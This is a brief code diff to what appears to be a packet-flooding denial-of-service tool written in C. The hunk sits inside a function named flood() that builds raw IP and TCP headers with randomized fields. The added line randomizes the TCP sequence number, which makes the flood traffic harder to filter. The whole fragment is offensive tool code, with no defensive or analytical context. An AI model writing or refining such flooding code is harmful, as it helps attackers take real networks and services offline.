@@ -305,6 +305,7 @@ void *flood(void *par1)
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
+		tcph->seq = htonl(randnum(1000000, 9999999));
 		if (bpgOrDrd == 1)
 		{
 			if (floodport == 0)
